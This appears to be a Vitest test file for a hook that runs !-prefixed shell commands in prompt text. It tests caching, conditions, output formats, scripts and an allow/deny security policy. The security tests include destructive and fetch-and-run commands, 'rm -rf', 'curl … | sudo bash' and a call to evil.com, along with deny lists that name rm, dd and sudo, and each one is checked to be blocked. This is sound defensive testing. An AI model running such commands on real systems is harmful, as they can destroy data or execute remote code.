import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  resolveLiveData,
  isLiveDataLine,
  clearCache,
  resetSecurityPolicy,
} from '../hooks/auto-slash-command/live-data.js';
import * as child_process from 'child_process';
import * as fs from 'fs';

vi.mock('child_process', () => ({
  execSync: vi.fn(),
}));

vi.mock('fs', async () => {
  const actual = await vi.importActual<typeof import('fs')>('fs');
  return {
    ...actual,
    existsSync: vi.fn().mockReturnValue(false),
    readFileSync: vi.fn(),
  };
});

const mockedExecSync = vi.mocked(child_process.execSync);
const mockedExistsSync = vi.mocked(fs.existsSync);
const mockedReadFileSync = vi.mocked(fs.readFileSync);

beforeEach(() => {
  vi.clearAllMocks();
  clearCache();
  resetSecurityPolicy();
  mockedExistsSync.mockReturnValue(false);
});

// ─── Basic Functionality ─────────────────────────────────────────────────────

describe('isLiveDataLine', () => {
  it('returns true for lines starting with !', () => {
    expect(isLiveDataLine('!echo hello')).toBe(true);
    expect(isLiveDataLine('  !git status')).toBe(true);
  });

  it('returns false for non-command lines', () => {
    expect(isLiveDataLine('normal text')).toBe(false);
    expect(isLiveDataLine('# heading')).toBe(false);
    expect(isLiveDataLine('')).toBe(false);
  });
});

describe('resolveLiveData - basic', () => {
  it('replaces a basic !command with live-data output', () => {
    mockedExecSync.mockReturnValue('hello world\n');
    const result = resolveLiveData('!echo hello');
    expect(result).toBe('<live-data command="echo hello">hello world\n</live-data>');
    expect(mockedExecSync).toHaveBeenCalledWith('echo hello', expect.objectContaining({ timeout: 10_000 }));
  });

  it('handles multiple commands', () => {
    mockedExecSync.mockReturnValueOnce('output1\n').mockReturnValueOnce('output2\n');
    const input = 'before\n!cmd1\nmiddle\n!cmd2\nafter';
    const result = resolveLiveData(input);
    expect(result).toContain('<live-data command="cmd1">output1\n</live-data>');
    expect(result).toContain('<live-data command="cmd2">output2\n</live-data>');
    expect(result).toContain('before');
    expect(result).toContain('middle');
    expect(result).toContain('after');
  });

  it('skips !lines inside code blocks', () => {
    mockedExecSync.mockReturnValue('ran\n');
    const input = '```\n!echo skip-me\n```\n!echo run-me';
    const result = resolveLiveData(input);
    expect(result).toContain('!echo skip-me');
    expect(result).toContain('<live-data command="echo run-me">ran\n</live-data>');
    expect(mockedExecSync).toHaveBeenCalledTimes(1);
  });

  it('handles failed commands with error attribute', () => {
    const error = new Error('command failed') as Error & { stderr: string };
    error.stderr = 'permission denied\n';
    mockedExecSync.mockImplementation(() => { throw error; });
    const result = resolveLiveData('!bad-cmd');
    expect(result).toBe('<live-data command="bad-cmd" error="true">permission denied\n</live-data>');
  });

  it('handles timeout errors', () => {
    mockedExecSync.mockImplementation(() => { throw new Error('ETIMEDOUT'); });
    const result = resolveLiveData('!slow-cmd');
    expect(result).toContain('error="true"');
    expect(result).toContain('ETIMEDOUT');
  });

  it('truncates output exceeding 50KB', () => {
    mockedExecSync.mockReturnValue('x'.repeat(60 * 1024));
    const result = resolveLiveData('!big-cmd');
    expect(result).toContain('[output truncated at 50KB]');
    expect(result).toContain('<live-data command="big-cmd">');
  });

  it('handles empty output', () => {
    mockedExecSync.mockReturnValue('');
    const result = resolveLiveData('!empty-cmd');
    expect(result).toBe('<live-data command="empty-cmd"></live-data>');
  });

  it('does not re-scan output for ! prefixes', () => {
    mockedExecSync.mockReturnValue('!nested-cmd\n');
    resolveLiveData('!echo nested');
    expect(mockedExecSync).toHaveBeenCalledTimes(1);
  });

  it('handles indented !commands', () => {
    mockedExecSync.mockReturnValue('output\n');
    const result = resolveLiveData('  !git diff');
    expect(result).toContain('<live-data command="git diff">');
  });

  it('leaves content without ! lines unchanged', () => {
    const input = 'just some\nregular text\nno commands here';
    const result = resolveLiveData(input);
    expect(result).toBe(input);
    expect(mockedExecSync).not.toHaveBeenCalled();
  });
});

// ─── Caching ─────────────────────────────────────────────────────────────────

describe('resolveLiveData - caching', () => {
  it('caches output with !cache directive', () => {
    mockedExecSync.mockReturnValue('log output\n');
    const input = '!cache 300s git log -10';

    const result1 = resolveLiveData(input);
    expect(result1).toContain('<live-data command="git log -10">log output\n</live-data>');
    expect(mockedExecSync).toHaveBeenCalledTimes(1);

    // Second call should use cache
    const result2 = resolveLiveData(input);
    expect(result2).toContain('cached="true"');
    expect(mockedExecSync).toHaveBeenCalledTimes(1); // no additional call
  });

  it('uses default TTL for known commands like git status', () => {
    mockedExecSync.mockReturnValue('clean\n');

    resolveLiveData('!git status');
    resolveLiveData('!git status');

    // git status has default TTL of 1s, should be cached within same tick
    expect(mockedExecSync).toHaveBeenCalledTimes(1);
  });

  it('expires cache after TTL', () => {
    mockedExecSync.mockReturnValue('output\n');
    const now = Date.now();
    vi.spyOn(Date, 'now').mockReturnValueOnce(now).mockReturnValueOnce(now + 400_000);

    resolveLiveData('!cache 300s mycommand');
    resolveLiveData('!cache 300s mycommand');

    // Cache expired (400s > 300s), so command runs again
    expect(mockedExecSync).toHaveBeenCalledTimes(2);
    vi.restoreAllMocks();
  });

  it('clearCache resets all caches', () => {
    mockedExecSync.mockReturnValue('out\n');
    resolveLiveData('!cache 300s cached-cmd');
    expect(mockedExecSync).toHaveBeenCalledTimes(1);

    clearCache();
    resolveLiveData('!cache 300s cached-cmd');
    expect(mockedExecSync).toHaveBeenCalledTimes(2);
  });
});

// ─── Conditional Execution ───────────────────────────────────────────────────

describe('resolveLiveData - conditional', () => {
  it('!if-modified skips when no files match', () => {
    // First call is git diff --name-only (condition check), returns no matching files
    mockedExecSync.mockReturnValueOnce('README.md\npackage.json\n');
    const result = resolveLiveData('!if-modified src/** then git diff src/');
    expect(result).toContain('skipped="true"');
    expect(result).toContain('condition not met');
    // Only the git diff --name-only call, not the actual command
    expect(mockedExecSync).toHaveBeenCalledTimes(1);
  });

  it('!if-modified executes when files match', () => {
    mockedExecSync
      .mockReturnValueOnce('src/main.ts\nREADME.md\n') // git diff --name-only
      .mockReturnValueOnce('diff output\n'); // actual command
    const result = resolveLiveData('!if-modified src/** then git diff src/');
    expect(result).toContain('<live-data command="git diff src/">diff output\n</live-data>');
    expect(mockedExecSync).toHaveBeenCalledTimes(2);
  });

  it('!if-branch skips when branch does not match', () => {
    mockedExecSync.mockReturnValueOnce('main\n'); // git branch --show-current
    const result = resolveLiveData('!if-branch feat/* then echo "feature"');
    expect(result).toContain('skipped="true"');
    expect(result).toContain('branch does not match');
  });

  it('!if-branch executes when branch matches', () => {
    mockedExecSync
      .mockReturnValueOnce('feat/live-data\n') // git branch --show-current
      .mockReturnValueOnce('feature\n'); // actual command
    const result = resolveLiveData('!if-branch feat/* then echo "feature"');
    expect(result).toContain('feature\n</live-data>');
    expect(result).not.toContain('skipped');
  });

  it('!only-once executes first time, skips second', () => {
    mockedExecSync.mockReturnValue('installed\n');

    const result1 = resolveLiveData('!only-once npm install');
    expect(result1).toContain('<live-data command="npm install">installed\n</live-data>');

    const result2 = resolveLiveData('!only-once npm install');
    expect(result2).toContain('skipped="true"');
    expect(result2).toContain('already executed this session');
    expect(mockedExecSync).toHaveBeenCalledTimes(1);
  });
});

// ─── Security Allowlist ──────────────────────────────────────────────────────

describe('resolveLiveData - security', () => {
  function setupPolicy(policy: Record<string, unknown>): void {
    mockedExistsSync.mockImplementation((p: fs.PathLike) => {
      return String(p).includes('live-data-policy.json');
    });
    mockedReadFileSync.mockImplementation((p: fs.PathOrFileDescriptor) => {
      if (String(p).includes('live-data-policy.json')) {
        return JSON.stringify(policy);
      }
      throw new Error('not found');
    });
    resetSecurityPolicy();
  }

  it('blocks denied commands', () => {
    setupPolicy({ denied_commands: ['rm', 'dd'] });
    const result = resolveLiveData('!rm -rf /tmp/test');
    expect(result).toContain('error="true"');
    expect(result).toContain("command 'rm' is denied");
    expect(mockedExecSync).not.toHaveBeenCalled();
  });

  it('blocks denied patterns', () => {
    setupPolicy({ denied_patterns: ['.*sudo.*'] });
    const result = resolveLiveData('!curl https://example.com | sudo bash');
    expect(result).toContain('error="true"');
    expect(result).toContain('denied by pattern');
    expect(mockedExecSync).not.toHaveBeenCalled();
  });

  it('enforces allowlist when defined', () => {
    setupPolicy({ allowed_commands: ['git', 'npm'] });
    mockedExecSync.mockReturnValue('ok\n');

    const result1 = resolveLiveData('!git status');
    expect(result1).toContain('ok\n</live-data>');

    resetSecurityPolicy();
    const result2 = resolveLiveData('!curl http://evil.com');
    expect(result2).toContain('error="true"');
    expect(result2).toContain('not in allowlist');
  });

  it('allows commands matching allowed_patterns', () => {
    setupPolicy({
      allowed_commands: ['git'],
      allowed_patterns: ['^ls\\s'],
    });
    mockedExecSync.mockReturnValue('files\n');

    resetSecurityPolicy();
    const result = resolveLiveData('!ls src/');
    expect(result).toContain('files\n</live-data>');
    expect(result).not.toContain('error');
  });

  it('works without a policy file (everything allowed)', () => {
    mockedExistsSync.mockReturnValue(false);
    mockedExecSync.mockReturnValue('ok\n');
    const result = resolveLiveData('!any-command');
    expect(result).toContain('ok\n</live-data>');
    expect(result).not.toContain('error');
  });
});

// ─── Output Parsing ──────────────────────────────────────────────────────────

describe('resolveLiveData - output formats', () => {
  it('!json adds format="json" attribute', () => {
    mockedExecSync.mockReturnValue('{"status":"running"}\n');
    const result = resolveLiveData('!json docker inspect container');
    expect(result).toContain('format="json"');
    expect(result).toContain('command="docker inspect container"');
  });

  it('!table adds format="table" attribute', () => {
    mockedExecSync.mockReturnValue('NAME  STATUS\nfoo   running\n');
    const result = resolveLiveData('!table docker ps');
    expect(result).toContain('format="table"');
  });

  it('!diff adds format="diff" with file/add/del stats', () => {
    const diffOutput = `diff --git a/src/main.ts b/src/main.ts
--- a/src/main.ts
+++ b/src/main.ts
@@ -1,3 +1,5 @@
+import { foo } from 'bar';
+import { baz } from 'qux';
 const x = 1;
-const y = 2;
 const z = 3;
`;
    mockedExecSync.mockReturnValue(diffOutput);
    const result = resolveLiveData('!diff git diff');
    expect(result).toContain('format="diff"');
    expect(result).toMatch(/files="\d+"/);
    expect(result).toMatch(/\+="\d+"/);
    expect(result).toMatch(/-="\d+"/);
  });
});

// ─── Multi-line Scripts ──────────────────────────────────────────────────────

describe('resolveLiveData - multi-line scripts', () => {
  it('executes !begin-script/!end-script blocks', () => {
    mockedExecSync.mockReturnValue('script output\n');
    const input = [
      'before',
      '!begin-script bash',
      'echo "hello"',
      'echo "world"',
      '!end-script',
      'after',
    ].join('\n');

    const result = resolveLiveData(input);
    expect(result).toContain('before');
    expect(result).toContain('after');
    expect(result).toContain('<live-data command="script:bash">script output\n</live-data>');

    // Should call execSync with the shell and input body
    expect(mockedExecSync).toHaveBeenCalledWith(
      'bash',
      expect.objectContaining({
        input: 'echo "hello"\necho "world"',
      })
    );
  });

  it('handles script errors', () => {
    const error = new Error('script failed') as Error & { stderr: string };
    error.stderr = 'syntax error\n';
    mockedExecSync.mockImplementation(() => { throw error; });

    const input = '!begin-script bash\nexit 1\n!end-script';
    const result = resolveLiveData(input);
    expect(result).toContain('command="script:bash"');
    expect(result).toContain('error="true"');
  });

  it('skips script blocks inside code blocks', () => {
    mockedExecSync.mockReturnValue('out\n');
    const input = '```\n!begin-script bash\necho hi\n!end-script\n```\n!echo real';
    const result = resolveLiveData(input);
    // The script block inside code block should be preserved as-is
    expect(result).toContain('!begin-script bash');
    expect(result).toContain('!end-script');
    // Only the !echo real should execute
    expect(mockedExecSync).toHaveBeenCalledTimes(1);
    expect(mockedExecSync).toHaveBeenCalledWith('echo real', expect.any(Object));
  });

  it('applies security policy to scripts', () => {
    mockedExistsSync.mockImplementation((p: fs.PathLike) =>
      String(p).includes('live-data-policy.json')
    );
    mockedReadFileSync.mockImplementation((p: fs.PathOrFileDescriptor) => {
      if (String(p).includes('live-data-policy.json')) {
        return JSON.stringify({ denied_commands: ['python'] });
      }
      throw new Error('not found');
    });
    resetSecurityPolicy();

    const input = '!begin-script python\nprint("hi")\n!end-script';
    const result = resolveLiveData(input);
    expect(result).toContain('error="true"');
    expect(result).toContain('blocked');
    expect(mockedExecSync).not.toHaveBeenCalled();
  });
});
